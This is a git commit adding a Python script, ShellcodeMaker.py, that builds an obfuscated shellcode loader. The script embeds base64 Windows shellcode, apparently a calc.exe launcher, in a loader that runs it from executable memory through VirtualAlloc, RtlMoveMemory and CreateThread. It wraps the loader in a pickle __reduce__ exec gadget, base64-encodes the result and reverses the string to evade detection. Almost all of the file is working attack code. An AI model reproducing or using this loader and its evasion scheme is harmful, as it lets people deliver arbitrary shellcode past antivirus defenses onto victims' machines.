2038ec0d97b38e4585c710e31693d03ff4184d72
Du4t <55538985+Du4t@users.noreply.github.com>
2022-04-22 16:44:09 +0800

    Add files via upload

---
+++ ShellcodeMaker.py
@@ -0,0 +1,39 @@
+from audioop import reverse
+from ntpath import join
+import pickle
+import ctypes
+import base64
+shellcode='''
+shellcode=base64.b64decode(b'/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA')
+shellcode = bytearray(shellcode)
+ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
+ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
+buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+ctypes.windll.kernel32.RtlMoveMemory(
+    ctypes.c_uint64(ptr), 
+    buf, 
+    ctypes.c_int(len(shellcode))
+)
+handle = ctypes.windll.kernel32.CreateThread(
+    ctypes.c_int(0), 
+    ctypes.c_int(0), 
+    ctypes.c_uint64(ptr), 
+    ctypes.c_int(0), 
+    ctypes.c_int(0), 
+    ctypes.pointer(ctypes.c_int(0))
+)
+ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
+'''
+
+class Test:
+    a=1
+    b=0
+    def __reduce__(self):    
+        return (exec,(shellcode,))
+
+shellcode=str(base64.b64encode(pickle.dumps(Test())))
+shellcode_r=list(shellcode)
+shellcode_r.reverse()
+shellcode=''.join(shellcode_r)
+print(shellcode)
+
